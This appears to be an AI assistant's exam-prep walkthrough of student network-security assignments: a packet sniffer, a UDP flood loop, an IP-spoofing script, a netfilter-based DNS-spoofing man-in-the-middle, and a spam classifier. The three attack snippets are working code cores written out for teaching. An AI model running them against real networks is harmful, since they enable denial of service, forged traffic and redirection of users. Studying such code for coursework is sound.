Okay, one by one. Read each fully before moving to next.

---

# Assignment 1 — `sniffer.py`

```python
from scapy.all import sniff

class Sniffer:
    def __init__(self, args):
        self.args = args

    def __call__(self, packet):
        if self.args.verbose:
            packet.show()
        else:
            print(packet.summary())

    def run_forever(self):
        sniff(iface=self.args.interface, prn=self, store=0)
```

**What's happening line by line:**

`from scapy.all import sniff` — imports Scapy's sniff function which captures live packets.

`class Sniffer` — wraps everything in a class so it's organized.

`__init__` — stores the command line arguments (interface name, verbose flag).

`__call__` — this is called automatically for every packet captured. If `-v` flag was passed, shows full packet details. Otherwise just prints a one-line summary.

`run_forever` — starts the actual sniffing. Three parameters:

- `iface` — which network interface to listen on (like `eth0`, `en0`)
- `prn=self` — callback function to call for each packet. Since `__call__` is defined, passing `self` works as a function
- `store=0` — don't store packets in memory (saves RAM during long capture)

**The argparse part at the bottom:**

```python
parser.add_argument("-v", "--verbose", ...)
parser.add_argument("-i", "--interface", ...)
```

This lets you pass `-i eth0` and `-v` from terminal.

**What the examiner will ask:**

- What is Scapy? → Python library for packet crafting and sniffing
- What does `store=0` do? → Prevents packets from being stored in memory
- What is `prn`? → Callback function called for every captured packet
- What is `packet.show()` vs `packet.summary()`? → show() gives full layer breakdown, summary() gives one line

---

# Assignment 2a — `Ddos.py`

```python
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_data = random._urandom(1490)

while True:
    sock.sendto(bytes_data, (ip, port))
    sent += 1
    port += 1
    if port > 65534:
        port = 1
```

**What's happening:**

`socket.AF_INET` — IPv4 address family.

`socket.SOCK_DGRAM` — UDP socket. UDP is used because it's connectionless — no handshake needed, just fire and forget. Way faster for flooding.

`random._urandom(1490)` — generates 1490 bytes of random data. This is the junk payload being sent. 1490 is close to the max UDP payload size before fragmentation.

`sock.sendto(bytes_data, (ip, port))` — sends the junk data to the target IP and port.

`port += 1` — keeps changing the destination port to bypass simple port-based firewalls.

`if port > 65534: port = 1` — wraps around since max port is 65535.

**The progress bar at the top** is just cosmetic — fake loading animation using `time.sleep()` to make it look dramatic.

**What the examiner will ask:**

- Why UDP and not TCP? → UDP is connectionless, no handshake, faster flooding
- What is a DDoS? → Distributed DoS — same attack but from multiple machines simultaneously
- What is the effect? → Target's CPU/bandwidth gets exhausted, can't serve real users
- What is a botnet? → Network of compromised machines used to launch DDoS
- Port range? → 0 to 65535, using system ports 0-1023 requires root

---

# Assignment 2b — `spoof.py`

```python
A = "192.168.5.126"  # spoofed source IP
B = "192.168.5.135"  # destination IP
C = RandShort()      # random source port
D = 80               # destination port
payload = "Hello Hello Hello"

while True:
    spoofed_packet = IP(src=A, dst=B) / TCP(sport=C, dport=D) / payload
    send(spoofed_packet)
```

**What's happening:**

`IP(src=A, dst=B)` — creates an IP layer with a **fake** source address. Normally the OS fills in your real IP. Scapy lets you override it with anything.

`TCP(sport=C, dport=D)` — creates a TCP layer. `sport` is source port (random), `dport=80` targets HTTP.

`/ payload` — the `/` operator in Scapy **stacks layers**. So the full packet is: IP layer → TCP layer → data payload. This is how real packets are structured too.

`RandShort()` — generates a random short integer for the source port each time.

`send()` — sends at Layer 3 (network layer), handles routing automatically.

**The effect:** The destination machine B receives packets that appear to come from A. A never sent them. So B's responses go to A, not the real attacker — hiding identity.

**What the examiner will ask:**

- What is IP spoofing? → Forging source IP in packet header to hide identity
- How does Scapy allow this? → It builds packets manually at each layer, bypassing OS restrictions
- What does `/` do in Scapy? → Stacks protocol layers together
- What is `RandShort()`? → Generates random short integer, used for random source port
- Real world use? → Used in DDoS reflection attacks, identity hiding

---

# Assignment 2c — `DNS_Attack.py`

This is the most complex one. Read carefully.

```python
class DnsSpoof:
    def __init__(self, hostDict, queueNum):
        self.hostDict = hostDict  # dict of domain → fake IP
        self.queue = NetfilterQueue()

    def __call__(self):
        os.system(f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
        self.queue.bind(self.queueNum, self.callBack)
        self.queue.run()

    def callBack(self, packet):
        scapyPacket = IP(packet.get_payload())
        if scapyPacket.haslayer(DNSRR):
            queryName = scapyPacket[DNSQR].qname
            if queryName in self.hostDict:
                scapyPacket[DNS].an = DNSRR(
                    rrname=queryName, rdata=self.hostDict[queryName])
                scapyPacket[DNS].ancount = 1
                del scapyPacket[IP].len
                del scapyPacket[IP].chksum
                del scapyPacket[UDP].len
                del scapyPacket[UDP].chksum
        packet.set_payload(bytes(scapyPacket))
        packet.accept()
```

**What's happening step by step:**

`hostDict` — maps domain names to fake IPs:

```python
{b"google.com.": "142.250.182.238"}  # fake IP for google
```

The `b""` means bytes — DNS queries are in bytes format, not strings.

`iptables -I FORWARD -j NFQUEUE` — this Linux command intercepts all forwarded packets and sends them to a queue (number 0). Your Python script reads from this queue. This is how you get in the middle.

`self.queue.bind(queueNum, self.callBack)` — tells netfilterqueue: "for every intercepted packet, call `callBack`".

**Inside `callBack`:**

`scapyPacket = IP(packet.get_payload())` — converts the raw intercepted packet into a Scapy packet object you can manipulate.

`scapyPacket.haslayer(DNSRR)` — checks if this packet contains a DNS Response Record. We only care about DNS responses (not all packets).

`scapyPacket[DNSQR].qname` — gets the domain name being queried (e.g., `b"google.com."`).

`if queryName in self.hostDict` — checks if we want to spoof this domain.

`scapyPacket[DNS].an = DNSRR(rrname=queryName, rdata=self.hostDict[queryName])` — **replaces** the real DNS answer with our fake IP.

`del scapyPacket[IP].len` etc — deletes the old checksums so Scapy recalculates them for the modified packet. Without this the packet would be corrupt.

`packet.set_payload(bytes(scapyPacket))` — puts the modified packet back.

`packet.accept()` — forwards the (now modified) packet to its destination.

**What the examiner will ask:**

- What is DNS spoofing? → Replacing legitimate DNS responses with fake IPs to redirect users
- What is iptables? → Linux firewall tool, here used to intercept packets into a queue
- What is DNSRR? → DNS Resource Record — the answer part of a DNS response
- Why delete checksums? → Packet was modified so old checksums are wrong, Scapy recalculates
- What is NFQUEUE? → Linux kernel mechanism to pass packets from kernel to userspace program
- Difference from DNS poisoning? → Spoofing intercepts live traffic, poisoning corrupts DNS cache

---

# Assignment 3 — Spam Detection (`assign3.py`)

The file in your repo is incomplete but here's what it does and what the full thing looks like conceptually:

```python
messages = pd.read_csv('spam.csv', encoding='latin-1')
# Clean up extra columns
messages.drop(['Unnamed: 2', 'Unnamed: 3', 'Unnamed: 4'], axis=1, inplace=True)
messages = messages.rename(columns={'v1': 'class', 'v2': 'text'})

# Pipeline: CountVectorizer → TF-IDF → Naive Bayes
pipeline = Pipeline([
    ('bow', CountVectorizer()),
    ('tfidf', TfidfTransformer()),
    ('classifier', MultinomialNB())
])
```

**What each part does:**

`pd.read_csv('spam.csv')` — loads the dataset. Each row has a label (`spam`/`ham`) and a message text.

`CountVectorizer()` — converts text into a matrix of word counts. Each unique word becomes a column. Each message becomes a row with counts of how many times each word appears.

`TfidfTransformer()` — converts raw counts to TF-IDF scores. TF-IDF gives less weight to common words (like "the", "is") and more weight to rare, meaningful words. Better than raw counts.

`MultinomialNB()` — Naive Bayes classifier. For each word, it calculates the probability that the message is spam given that word appears. Combines probabilities for all words to make final decision.

`Pipeline` — chains all three steps so you can call `.fit()` and `.predict()` in one go.

`train_test_split` — splits data into training set (model learns from it) and test set (model is evaluated on unseen data).

`classification_report` — shows precision, recall, F1 score for spam and ham classes.

**What the examiner will ask:**

- What is Naive Bayes? → Probabilistic classifier based on Bayes theorem, assumes word independence
- What is TF-IDF? → Term Frequency-Inverse Document Frequency — weights words by importance
- What is a false positive here? → Ham email classified as spam — worse than missing spam
- What is CountVectorizer? → Converts text to numerical word count matrix
- What is a Pipeline? → Chains preprocessing and model steps so they execute in sequence
- What dataset is used? → SMS Spam Collection dataset — labeled spam/ham messages

---

That's all 5. Which one do you want to go deeper on?
